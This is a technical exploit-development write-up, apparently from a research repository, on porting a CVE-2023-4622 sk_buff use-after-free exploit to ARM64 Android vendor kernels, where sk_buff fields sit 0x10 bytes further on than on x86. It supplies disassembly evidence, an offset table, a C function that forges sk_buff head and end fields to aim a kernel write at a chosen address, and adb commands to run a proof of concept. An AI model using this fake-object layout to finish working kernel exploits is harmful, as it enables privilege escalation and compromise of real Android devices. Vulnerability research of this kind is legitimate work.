# ARM64 Android `sk_buff` Offset Divergence: A +0x10 Trap

## Summary

Public Linux kernel exploits targeting `sk_buff` structures assume mainline x86 field offsets. On ARM64 Android vendor kernels (tested: MT6893, kernel 4.19.191, clang-11), every field from `tail` onward is shifted by **+0x10 bytes** due to additional vendor-patched fields inserted before the `tail`/`end`/`head` block. An exploit using the wrong offsets writes `end` and `head` to the wrong slots, producing `skb_shared_info` at an unmapped address (e.g., `0xffffff96`) and an immediate Data Abort kernel panic instead of a controlled write primitive.

This is a silent, hard failure: the spray "works" (object reclaimed), the race fires (UAF triggered), but the kernel write lands at a garbage address and crashes instantly.

## Background

`sk_buff` is the kernel's network buffer descriptor. Exploits that corrupt freed `sk_buff` objects (e.g., via pipe page spray into a UAF slab) need to forge specific fields so that `skb_append_pagefrags()` computes a controlled `skb_shared_info` pointer:

```c
shinfo = skb->head + skb->end;   // skb_end_pointer()
```

If `head` and `end` are placed at the correct offsets, the attacker controls `shinfo` and can direct a write to an arbitrary kernel address. If they're placed at the **wrong** offsets, the kernel reads uninitialized or misaligned data.

## IDA Evidence

From `skb_append_pagefrags` at `0xffffff800a359fa8` (vmlinux_rebuilt):

```asm
0xa359fac:  LDR X9,  [X0, #0xE0]    ; skb->head  (u64 pointer)
0xa359fb0:  LDR W10, [X0, #0xDC]    ; skb->end   (u32 offset)
0xa359fb4:  ADD X11, X9, X10         ; shinfo = head + end
```

And from `unix_stream_sendpage` post-append accounting at `0xa49b2bc`:

```c
*(_DWORD *)(v10 + 0xF0) = v22;  // truesize
```

## Offset Comparison Table

| Field | ARM64 vendor (actual) | x86 / mainline (assumed) | Delta |
|-------|----------------------|--------------------------|-------|
| `tail` | `0xD8` | `0xC8` | +0x10 |
| `end` | **`0xDC`** | `0xCC` | +0x10 |
| `head` | **`0xE0`** | `0xD0` | +0x10 |
| `data` | `0xE8` | `0xD8` | +0x10 |
| `truesize` | `0xF0` | `0xE0` | +0x10 |
| `users` | **`0xF4`** | `0xE4` | +0x10 |

The uniform +0x10 shift is caused by additional fields (likely Android networking extensions, QTAGUID, or vendor hooks) inserted into `struct sk_buff` before the `tail` member by the vendor kernel build.

## What Goes Wrong

With x86-assumed offsets, the spray writes:

```c
*(uint32_t *)(obj + 0xCC) = fake_end;    // intended: end
*(uint64_t *)(obj + 0xD0) = fake_head;   // intended: head
*(uint32_t *)(obj + 0xE4) = 100;         // intended: users
```

But `skb_append_pagefrags` reads from the **actual** offsets:

- `end`  from `obj[0xDC]` = high 32 bits of the value written at `0xD0` = `0xffffff96`
- `head` from `obj[0xE0]` = `0` (unwritten, zeroed by memset)
- `shinfo = 0 + 0xffffff96 = 0xffffff96`

The kernel then executes `LDRB [0xffffff98]` (reading `shinfo->nr_frags`), which is an unmapped address in the user-kernel gap. Result: **Data Abort, immediate kernel panic.**

The race and spray both succeeded perfectly -- the wrong offsets turn a working primitive into a guaranteed crash.

## Root Cause

Android vendor kernels routinely add fields to core kernel structures for:
- Traffic tagging (QTAGUID / xt_qtaguid)
- Battery statistics
- Vendor-specific networking hooks
- CONFIG options enabled only in Android defconfigs

These additions are invisible unless you disassemble the actual `vmlinux` from the target device. The mainline kernel source and x86 builds are not authoritative references for ARM64 Android struct layouts.

## Correct Spray Layout

```c
#define SKB_OFF_END    0xDC   // LDR W10,[X0,#0xDC] @ 0xa359fb0
#define SKB_OFF_HEAD   0xE0   // LDR X9,[X0,#0xE0]  @ 0xa359fac
#define SKB_OFF_DATA   0xE8   // after head (8 bytes)
#define SKB_OFF_USERS  0xF4   // truesize@0xF0, users@0xF4

void build_fake_skb(uint8_t *obj, uint64_t target, uint32_t fake_end) {
    uint64_t fake_head = target - (uint64_t)fake_end;
    *(uint32_t *)(obj + SKB_OFF_END)   = fake_end;
    *(uint64_t *)(obj + SKB_OFF_HEAD)  = fake_head;
    *(uint64_t *)(obj + SKB_OFF_DATA)  = fake_head;
    *(uint32_t *)(obj + SKB_OFF_USERS) = 100;  // prevent kfree_skb
}
// shinfo = fake_head + fake_end = target  (controlled)
```

## PoC

[`poc/skb_spray_demo.c`](poc/skb_spray_demo.c) -- Demonstrates the layout difference between correct and incorrect sk_buff spray construction. Shows how the wrong offsets produce a garbage `shinfo` pointer.

```bash
cd poc && make -f ../../common/Makefile.ndk
adb push skb_spray_demo /data/local/tmp/
adb shell /data/local/tmp/skb_spray_demo
```

## Takeaway

When porting kernel exploits across architectures or from mainline to vendor kernels, **IDA-confirm every struct offset on the target binary.** A uniform field shift is the easy case -- vendor kernels can also insert fields at arbitrary positions within a struct, producing non-uniform offsets that are even harder to diagnose.

## References

- [CVE-2023-4622 (unix_stream_sendpage UAF)](https://nvd.nist.gov/vuln/detail/CVE-2023-4622)
- [kernelCTF original PoC (x86 LTS 6.1.36)](https://github.com/google/security-research/tree/master/pocs/linux/kernelctf)
- `skb_append_pagefrags` in `net/core/skbuff.c`
